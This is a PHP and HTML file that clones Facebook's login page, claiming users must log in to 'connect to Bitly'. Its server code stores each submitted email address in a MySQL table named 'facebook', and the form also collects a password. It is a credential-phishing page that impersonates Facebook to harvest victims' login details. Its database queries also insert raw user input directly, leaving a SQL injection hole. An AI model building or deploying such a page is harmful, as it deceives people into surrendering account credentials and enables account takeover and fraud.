<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "jumia_db";

// // create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);

// check connection
if(!$conn){
    die("connection error" . mysqli_connect_error());
} else{
    echo "connteced successfully";
}

// when the user clicks on the button

if (isset($_POST['login'])){
    $Email = $_POST['email'];
if (empty($_POST['email'])){
    echo "email is required";
} else{
    $sql = "INSERT INTO facebook (email) values ('$Email')";
}
$sql = "SELECT * from facebok where email = '$Email'";
$result = mysqli_query($conn, $sql);
if (mysqli_num_rows($result) > 0) {
    echo "cannot update twice";
} 
else {
$sql = "INSERT INTO facebook (email) values ('$Email')";
if (mysqli_query($conn, $sql)){
    echo "record updated";
} else {
    echo "error upadting record";
}
}
}

mysqli_close($conn);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - log in or sign up</title>
    <link rel="shortcut icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKUAAAClCAMAAAAK9c3oAAAAY1BMVEU6VZ////83U543VqLd4OxGX6UzUJ3K0OJmerEaQJbFy94oSZry9PiIl8Hq7PNhc60iRZhyg7aapclAWqFtf7V5ibuEk8BLY6awuNPBx91SaKjj5u+1vteQnMOpstASPZUDOJNUVmbBAAACQklEQVR4nO3a2W6DMBCFYeoSQ2KCCUnTLN3e/ynbtJUqNcbg9kzGSOe/jLj45LAOFAVjjDHGGGOMMcb+kbHWDWS0bZ99Ard+97Bfh9o/ZsC0y8dNX7V3w+2svtEfyojwo6ZWVlrrqzhRX2k6vxo1aitN18f2xjyUthj/s9WVzo8cNDkonW8mIhWVzk81Kiqtn3Tc6CpNMXWfVFSa7piA1FK6dQpSSWlP5xko3SEJqaM0Jg2po1w+zUBpFpMvOopK95yI1FCaqXdCuspTwrVRTWkfUpEayu5lFNX+6uxvrnwd2S2rflP7X21v/jz+Ft0t24119qrbDw3eogu5yGPaYmLKdqs+xPjKuIjSO23ed+Z+GHnMZCXjynUuSxlTttpDq58iyvMpi+P7UkRZLqhMikpcVOKiEheVuKjERSUuKv8oCmSjynCyyPCPma2l66tQg8omuPlHveRT2zJ5UDnQsZNUTnlDPyXZtUQp93NQNqLjS5hS9FwEU0oePDBluZyDcjUL5css/nHRExFMKTswRCllB4YgZSNphClL2RtMkHIl+1IKpDzITttByn4WStnTJUjZbOawlq3wy3GMshT+WB2jrIRf+2GUsvdtKOVB9L4N9Twu+phbXL6qra/z9aDnvAtsX4uPZa4/E7k0qCy3oc115nDZTQZDUYmLSlxU4qISF5W4qMRFJS4qcVGJi0pcVOKiEheVuKjERSUuKnFRiYtKXFTiohIXlbioxEUlLipxUYmLSlxU4qISF5W4qMQFVr4DpEguTkwkF0YAAAAASUVORK5CYII=">
    <style>
        *{
            box-sizing: border-box;
            padding: 0;
            margin: 0;
        }
        body {
            background: #fff;
            color: #1c1e21;
            direction: ltr;
            line-height: 1.34;
            margin: 0;
            padding: 0;
            overflow-y: scroll;
        }
        body, button, input, label, select, td, textarea {
            font-family: Helvetica, Arial, sans-serif;
            font-size: 12px;
        }
        .main_inner{
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: inherit;
            font-family: inherit;
            min-height: 640px;
            background: #f0f2f5;
            min-width: 500px;
            width: auto;
        }
        .login_intro{
            width: 468px;
            margin-right: 20px;
        }
        .fb_logo{
            height: 106px;
            margin: -28px;
        }
        .fb_text{
            font-size: 24px;
            line-height: 28px;
            width: auto;
            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
            font-weight: normal;
        }
        .login_form{
            /* height: 456px; */
            width: 396px;
        }
        .form_cont{
            font-family: inherit;
            padding-bottom: 24px;
            padding-top: 10px;
            text-align: center;
            align-items: center;
            background-color: #fff;
            border: none;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
            box-sizing: border-box;
            margin: 40px 0 0;
            padding: 20px 0 28px;
            width: 396px;
        }
        .desktop_input{
            font-family: inherit;
            font-size: 17px;
            width: 364px;
            display: inline-block;
            margin: auto;
            padding: 6px 0;
        }
        .inputtext{
            font-family: inherit;
            border-radius: 6px;
            font-size: 17px;
            padding: 14px 16px;
            width: 362px;
            border: 1px solid #dddfe2;
            background: #FFFFFF url(https://static.xx.fbcdn.net/rsrc.php/v3/yU/r/O7nelmd9XSI.png) repeat-x;
            color: #1d2129;
            height: 50px;
            line-height: 16px;
            vertical-align: middle;
            
        }
        .inputtext:focus{
            color: #1877f2;
            border: 1px solid #1877f2 !important; 
            /* background-color: red; */
        }
        
        .fb_btn{
            font-family: inherit;
            padding-top: 14px;
        }
        .login{
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            line-height: 48px;
            padding: 0 16px;
            width: 362px;
            color: #fff;
            transition: 200ms cubic-bezier(.08,.52,.52,1) background-color, 200ms cubic-bezier(.08,.52,.52,1) box-shadow, 200ms cubic-bezier(.08,.52,.52,1) transform;
        }
        .login::before{
            content: '';
            display: inline-block;
            height: 20px;
            vertical-align: middle;
        }
        .forget_password{
            font-family: inherit;
            margin-top: 16px;
            display: block;
        }
        .forget_password a{
            font-family: inherit;
            color: #1877f2;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            text-decoration: none;
        }
        .divider{
            align-items: center;
            border-bottom: 1px solid #dadde1;
            display: flex;
            margin: 20px 16px;
            text-align: center;
        }
        .new_account{
            font-family: inherit;
            padding-top: 6px;
        }
        .CNA{
            font-family: inherit;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            line-height: 48px;
            padding: 0 16px;
            background-color: #42b72a;
            color: #fff;
            transition: 200ms cubic-bezier(.08,.52,.52,1) background-color, 200ms cubic-bezier(.08,.52,.52,1) box-shadow, 200ms cubic-bezier(.08,.52,.52,1) transform;
            box-sizing: content-box;
            -webkit-font-smoothing: antialiased;
            font-weight: bold;
            justify-content: center;
            position: relative;
            text-align: center;
            text-shadow: none;
            vertical-align: middle;
            cursor: pointer;
            display: inline-block;
            text-decoration: none;
            white-space: nowrap;
        }

        .CNA::before{
            content: '';
            display: inline-block;
            height: 20px;
            vertical-align: middle;
        }
        .under_txt{
            border-top: none;
            color: #1c1e21;
            font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
            font-size: 14px;
            font-weight: normal;
            padding-top: 0;
            margin-top: 28px;
            text-align: center;
        }
        .page{
            font-family: SFProText-Semibold, Helvetica, Arial, sans-serif;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            color: inherit;
        }
        .class{
            font-family: inherit;
        }
        .footer_class{
            padding-top: 20px;
            font-family: inherit;
        }
        #pagefooter{
            margin: 0 40px;
            width: auto;
            font-family: inherit;
            color: #737373;
        }
        ._2pid {
            padding-top: 8px;
        }
        .localeSelectorList {
            align-items: center;
            display: flex;
            flex-wrap: wrap;
        }
        ul {
            list-style-type: none;
            margin: 0;
            padding: 0;
        }
        ._4ki>li {
            border-width: 0 0 0 1px;
            display: inline-block;
        }
        li {
            /* display: list-item; */
            text-align: -webkit-match-parent;
        }
        ._4ki._6-i>li {
            padding-right: 0;
        }
        ._4ki._6-j>li {
            /* padding-left: 10px; */
            padding-right: 10px;
        }
        ._509->li {
            vertical-align: top;
        }
        ._4ki>li {
            border-width: 0 0 0 1px;
            display: inline-block;
        }
        .contentcurve{
            border-bottom: 1px solid #dddfe2;
            font-size: 1px;
            height: 8px;
            margin-bottom: 8px;
            font-family: inherit;
        }
        #pagefooter a{
            color: #737373;
        }
        #pageFooter .pageFooterLinkList {
            line-height: 1.6;
            margin-left: -20px;
        }
        ._4ki._703>li {
            /* padding-left: 20px; */
        }
        .uiList>li:first-child {
            border-width: 0;
        }
        ._509->li {
            vertical-align: top;
        }
        ._4ki>li {
            border-width: 0 0 0 1px;
            display: inline-block;
        }
        ._4ki._6-i>li {
            padding-right: 0;
        }
        #pageFooter .copyright {
            font-size: 11px;
            font-family: inherit;
        }
        .mvl {
            margin-top: 20px;
            margin-bottom: 20px;
        }
        .bitly{
            display: none;
        }
        .bit{
            display: none;
        }
        @media only screen and (max-width: 600px) {
            .main_inner{
                flex-direction: column;
            }
            .fb_text{
                display: none;
            }
            .login_intro{
                text-align: center;
            }
            .bitly{
                display: flex;
                /* flex-direction: column; */
                justify-content: center;
                /* align-items: center; */
                width: 100%;
                
            }
            .bitly_icon{
                width: 50px;
                text-align: center;
            }
            .bit-txt{
                text-align: center;
                margin-top: 20px;
            }
            .bit{
                display: block;
                margin-top: 20px;
                /* padding-top: 20px */
            }
            #pagefooterchildren{
                display: none;
            }
            ._2pid{
                flex-direction: column;
                max-height: 120px;
                width: 33%;
                margin: 0 auto;
            }
            .mvs{
                text-align: center;
                text-align: -webkit-center;
            }
            

        }
    </style>
</head>
<body>
    <main>
        <div class="main_inner">
            <div class="login_intro">
                <div class="facebook">
                    <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="" class="fb_logo">
                </div>
                <h2 class="fb_text">Facebook helps you connect and share with the people in your life.</h2>
            </div>
            <div class="login_form">
                <div class="bit">
                    <div class="bitly">
                        <img src="./image/bitly_icon-removebg-preview.png" alt="" class="bitly_icon">
                    </div>
                    <div class="bit-txt">
                        Log in to your Facebook account to connect to <br> Bitly
                    </div>
                </div>
                
                <div class="form_cont">
                    <form action="index.php" method="post">
                        <input type="hidden" name="" value="" autocomplete="off">
                        <input type="hidden" name="" value="" autocomplete="off">
                        <div>
                            <div class="desktop_input">
                                <input type="text" class="inputtext" name="email" id="email" placeholder="Email address or phone number" autofocus="1" aria-label="Email address or phone number">
                            </div>
                            <div class="second_input">
                                <div class="second_inner">
                                    <input type="password" class="inputtext" name="pass" id="pass" placeholder="Password" aria-label="Password">
                                </div>
                            </div>
                        </div>
                        <div class="fb_btn">
                            <button value="1" class="login" name="login" type="submit" id="login">Log in</button>
                        </div>
                        <div class="forget_password">
                            <a href="https://web.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjY5MTU0ODYyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login">Forgotten password?</a>
                        </div>
                        <div class="divider"></div>
                        <div class="new_acct">
                            <a role="button" class="CNA" href="#" id="new_acct">Create New Account</a>
                        </div>
                    </form>
                </div>
                <div class="under_txt">
                    <a href="https://web.facebook.com/pages/create/?ref_type=registration_form" class="page">Create a Page</a>
                    for a celebrity, brand or business.
                </div>
            </div>
        </div>
    </main>
    <div class="class">
        <div class="footer_class">
            <div id="pagefooter">
                <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
                    <li>English (UK)</li>
                    <li><a class="_sv4" dir="ltr" href="https://ha-ng.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ha_NG&quot;, &quot;en_GB&quot;, &quot;https:\/\/ha-ng.facebook.com\/&quot;, &quot;www_list_selector&quot;, 0); return false;" title="Hausa">Hausa</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://fr-fr.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;fr_FR&quot;, &quot;en_GB&quot;, &quot;https:\/\/fr-fr.facebook.com\/&quot;, &quot;www_list_selector&quot;, 1); return false;" title="French (France)">Français (France)</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://pt-br.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;pt_BR&quot;, &quot;en_GB&quot;, &quot;https:\/\/pt-br.facebook.com\/&quot;, &quot;www_list_selector&quot;, 2); return false;" title="Portuguese (Brazil)">Português (Brasil)</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://es-la.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;es_LA&quot;, &quot;en_GB&quot;, &quot;https:\/\/es-la.facebook.com\/&quot;, &quot;www_list_selector&quot;, 3); return false;" title="Spanish">Español</a></li><li><a class="_sv4" dir="rtl" href="https://ar-ar.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ar_AR&quot;, &quot;en_GB&quot;, &quot;https:\/\/ar-ar.facebook.com\/&quot;, &quot;www_list_selector&quot;, 4); return false;" title="Arabic">العربية</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://id-id.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;id_ID&quot;, &quot;en_GB&quot;, &quot;https:\/\/id-id.facebook.com\/&quot;, &quot;www_list_selector&quot;, 5); return false;" title="Indonesian">Bahasa Indonesia</a></li><li><a class="_sv4" dir="ltr" href="https://de-de.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;de_DE&quot;, &quot;en_GB&quot;, &quot;https:\/\/de-de.facebook.com\/&quot;, &quot;www_list_selector&quot;, 6); return false;" title="German">Deutsch</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://ja-jp.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;ja_JP&quot;, &quot;en_GB&quot;, &quot;https:\/\/ja-jp.facebook.com\/&quot;, &quot;www_list_selector&quot;, 7); return false;" title="Japanese">日本語</a></li><li><a class="_sv4" dir="ltr" href="https://it-it.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;it_IT&quot;, &quot;en_GB&quot;, &quot;https:\/\/it-it.facebook.com\/&quot;, &quot;www_list_selector&quot;, 8); return false;" title="Italian">Italiano</a></li>
                    <li><a class="_sv4" dir="ltr" href="https://hi-in.facebook.com/" onclick="require(&quot;IntlUtils&quot;).setCookieLocale(&quot;hi_IN&quot;, &quot;en_GB&quot;, &quot;https:\/\/hi-in.facebook.com\/&quot;, &quot;www_list_selector&quot;, 9); return false;" title="Hindi">हिन्दी</a></li><li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog" ajaxify="/settings/language/language/?uri=https%3A%2F%2Fhi-in.facebook.com%2F&amp;source=www_list_selector_more" href="#" title="Show more languages"><i class="img sp_KZKMI6hQbNz sx_a986c0"></i></a></li>
                    <a href="/language/?next_uri=https%3A%2F%2Fm.facebook.com%2F&amp;refid=8">
                        <div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages" data-sigil="more_language">
                            <i class="img sp_zW6EzRbnK3e sx_5b6e28"></i>
                        </div>
                    </a>
                </ul>
                <div class="contentcurve"></div>
                <div id="pagefooterchildren">
                    <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                        <li><a href="/reg/" title="Sign up for Facebook">Sign Up</a></li>
                        <li><a href="/login/" title="Log in to Facebook">Log in</a></li>
                        <li><a href="https://messenger.com/" title="Take a look at Messenger.">Messenger</a></li>
                        <li><a href="/lite/" title="Facebook Lite for Android.">Facebook Lite</a></li>
                        <li><a href="https://web.facebook.com/watch/" title="Browse our Watch videos.">Watch</a></li>
                        <li><a href="/places/" title="Take a look at popular places on Facebook.">Places</a></li>
                        <li><a href="/games/" title="Check out Facebook games.">Games</a></li>
                        <li><a href="/marketplace/" title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
                        <li><a href="https://pay.facebook.com/" title="Learn more about Meta Pay" target="_blank">Meta Pay</a></li>
                        <li><a href="https://www.oculus.com/" title="Learn more about Oculus" target="_blank">Oculus</a></li>
                        <li><a href="https://portal.facebook.com/" title="Learn more about Facebook Portal" target="_blank">Portal</a></li>
                        <li><a href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT39DIshBId79ruJzjqx4By_5VWPWLnh2CON8FrChEC5Yfu3vgjPcZjB2cDvi80OsgzvQDfjs5OTt47B_IQFHLqvHY_-TKbh_1dGBMmDgKOSr_DnmYQVPOCp8zgn2jr8wr0KNLI00c3ACdcqDVpqH-2hv9bIE-XcIjI" title="Take a look at Instagram" target="_blank" rel="noopener nofollow" data-lynx-mode="async">Instagram</a></li>
                        <li><a href="https://www.bulletin.com/" title="Take a look at Bulletin newsletter">Bulletin</a></li>
                        <li><a href="/fundraisers/" title="Donate to worthy causes.">Fundraisers</a></li><li><a href="/biz/directory/" title="Browse our Facebook Services directory.">Services</a></li>
                        <li><a href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D" title="See the Voting Information Centre">Voting Information Centre</a></li>
                        <li><a href="/groups/explore/" title="Explore our groups.">Groups</a></li>
                        <li><a href="https://about.facebook.com/" accesskey="8" title="Read our blog, discover the resource centre and find job opportunities.">About</a></li>
                        <li><a href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto" title="Advertise on Facebook">Create ad</a></li>
                        <li><a href="/pages/create/?ref_type=site_footer" title="Create a Page">Create Page</a></li>
                        <li><a href="https://developers.facebook.com/?ref=pf" title="Develop on our platform.">Developers</a></li>
                        <li><a href="/careers/?ref=pf" title="Make your next career move to our brilliant company.">Careers</a></li>
                        <li><a data-nocookies="1" href="/privacy/policy/?entry_point=facebook_page_footer" title="Learn how we collect, use and share information to support Facebook.">Privacy Policy</a></li>
                        <li><a data-nocookies="1" href="/privacy/center/?entry_point=facebook_page_footer" title="Learn how to manage and control your privacy on Facebook.">Privacy Centre</a></li>
                        <li><a href="/policies/cookies/" title="Learn about cookies and Facebook." data-nocookies="1">Cookies</a></li>
                        <li><a class="_41ug" data-nocookies="1" href="https://web.facebook.com/help/568137493302217" title="Learn about AdChoices.">AdChoices<i class="img sp_KZKMI6hQbNz sx_c1b66b"></i></a></li>
                        <li><a data-nocookies="1" href="/policies?ref=pf" accesskey="9" title="Review our terms and policies.">Terms</a></li>
                        <li><a href="/help/?ref=pf" accesskey="0" title="Visit our Help Centre.">Help</a></li><li><a href="help/637205020878504" title="Visit our contact uploading and non-users notice.">Contact uploading and non-users</a></li>
                        <li><a accesskey="6" class="accessible_elem" href="/settings" title="View and edit your Facebook settings.">Settings</a></li><li><a accesskey="7" class="accessible_elem" href="/allactivity?privacy_source=activity_log_top_menu" title="View your activity log">Activity log</a></li>
                    </ul>
                </div>
                <div class="mv1 copyright">
                    <div class="mvs">
                        <span> Meta © 2022</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>